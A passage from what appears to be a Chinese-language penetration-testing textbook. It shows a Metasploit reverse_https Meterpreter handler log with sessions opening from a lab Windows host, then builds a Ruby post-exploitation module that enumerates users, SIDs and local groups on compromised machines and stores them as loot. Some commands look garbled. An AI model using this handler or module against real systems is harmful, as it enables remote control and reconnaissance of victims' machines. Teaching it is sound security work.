

```bash
rootshell@victim # msfconsole
use exploit/handler
set payload -n windows
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 172.16.85.149
LHOST = 172.16.85.149
msf exploit(handler) > set LPORT 443
LPORT = 443
msf exploit(handler) > set ExitOnSession false
ExitOnSession = false
[*] Exploit running as background job.
[*] Started Metasploit handler on: 0.0.0.0:443
[*] 172.16.85.153:45982 (UID: da069962d2b6a294c9/443/windows/2016-05-15T02:29:31) Attaching or handles
[*] Meterpreter session 1 opened (172.16.85.149:49443 -> 172.16.85.153:45982) at 2016-05-15T10:17:16 -0400
[*] 172.16.85.153:45982 (UID: da069962d2b6a294c9/443/windows/2016-05-15T02:29:31) Staging Native payload ...meterpreter ...
[*] Meterpreter session 2 opened (172.16.85.149:49444 -> 172.16.85.153:45982) at 2016-05-15T10:17:16 -0400
```

# 图 10.5 启动我们的 Metasploit 监听器。

当我们的代码运行时，我们会看到一条消息，指示它正在监听连接。现在我们在 Windows 机器上运行我们的可执行文件。这将导致可执行文件连接回我们的监听器并打开我们的 shell。图 10.5 显示了我们的 shell 开启。我们现在有了一个 Meterpreter 连接来运行我们的脚本。

# 构建基础脚本

在本章中，我们已经构建了几个 shellcode。我们已经有了方法来列出用户、组和网络信息。下一步是获取这些代码并将其放入一种格式中，以便我们在攻破主机时可以方便地运行它。Metasploit 的 post 模块（后期模块）是实现此点的简单方法。它们用 Ruby 编写，一旦我们获取了 shell，就可以在 Meterpreter 中执行。post 模块与我们在第 9 章利用脚本中使用的 exploit 模块类似，但它们在 Meterpreter 内部运行，而不是 Metasploit 中。

post 模块与其他 Metasploit 模块存储在相同的树结构中。对于我们的示例，我们将在 `~/msf/modules/post/windows/gather/` 目录下创建 `wininfo.rb` 文件。为了构建我们的脚本，我们可以获取他人编写的片段，并将它们组合成执行我们所需功能的自定义工具。

首先，我们需要确定为脚本想要拥有哪些选项。如果我们的脚本能够列出用户、组和网络信息，那就太好了。有时，我们可能想要一个、两个或三个选项。为了实现这一点，我们将使用 Metasploit 内置的选项处理功能。让我们来看。

##

```ruby
# 此模块需要 Metasploit:
# https://metasploit.com/download
# 当前源码: https://github.com/rapid7/metasploit-framework
require 'msf/core'
require 'rex'
class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::WMIC
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Gather Basic Information About a System',
      'Description' => 'This module will enumerate users, groups, and network information',
      'License' => MSF_LICENSE,
      'Author' => ['Ryan Linn <sussurro[at]happypacket.net>'],
      'Platform' => ['win'],
      'SessionTypes' => ['meterpreter'])
    )
    register_options(
      [
        Opt.string('INFO', [false, 'Information to gather (User/Group/Network)')
      ], self.class)
```

这看起来与我们的 exploit 模块的开头非常相似。我们包含了一系列 Mix-Ins，它们允许我们与注册表、账户和 WMIC 交互。我们在 `initialize` 函数中包含了标准信息，但注意这里我们不需要设置任何关于 payload 的内容，因为没有 payload。我们还有一段代码注册选项。在这种情况下，我们创建了一个名为 `INFO` 的字符串，用户可以在其中设置他们想要检索的值。我们可以输入 U 代表用户，G 代表组，或 N 代表网络，或者之前这些值的任何组合，以便一次性中检索多项数据。

接下来，我们正在创建三个函数：`get_users`、`get_group` 和 `get_net`。这些函数允许我们将与每个区域相关的代码放在自己的函数中，以便我们在需要时可以将它们复制到其他地方，并且更方便地跟踪发生的情况。让我们先看 `get_users` 函数。

```ruby
def get_users()
    users = []
    data = wmic_query('account list brief /FORMAT:csv').split("\n")
    # 从 WMIC 输出中提取域名和 sid，在线状态
    data[2..-1].each do |line|
        tmp = line.rstrip().split(',')
        userinfo = [tmp[0], tmp[5], tmp[6]]
        userinfo << registry_key_exist?("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\#{userinfo[2]}")
        users << userinfo
    end
    # 生成一个输出表格
    tbl = Rex::Ui::Table.new(
        'Header' => 'System Users',
        'Indent' => 1,
        'Columns' => %w(Username SID Profile))
    users.each do |user|
        tbl << user
    end
    print_line("\n" + tbl.to_s + "\n")
    store_loot('host.users', '/text/plain', session, tbl.to_s, 'System Users')
end
```

我们的 `get_users` 函数首先定义了一个名为 `users` 的数组。我们使用 `wmic` 获取信息，但我们需要用户名、SID 以及注册表列表是否存在。`userinfo` 数组存储了这些值。我们生成一个输出表格并打印。

```ruby
def get_group()
    groups = []
    data = wmic_query('group list brief /FORMAT:csv').split("\n")
    data[3..-1].each do |line|
        line.rstrip!
        info = line.split(',')[3..-1]
        groups << info
    end
    tbl = Rex::Ui::Table.new(
        'Header' => 'System Groups',
        'Indent' => 1,
        'Columns' => %w(Name SID Members))
    print_status('Dumping groups.. please wait')
    groups.each do |group|
        p = session.sys.process.execute("cmd /c net localgroup #{group[0]}", nil, 'Hidden' => true, 'Channelized' => true)
        out = data = ''
        while (data = p.channel.read)
            out << data
        end
        p.channel.close
        valid = out.split("\r\n")[6..-2]
        group[2] = ''
        group[2] = valid.join(',') unless valid.empty?
        tbl << [group[1], group[0], group[2]]
    end
    print_line("\n" + tbl.to_s + "\n")
    store_loot('host.groups', '/text/plain', session, tbl.to_s, 'System Groups')
end
```

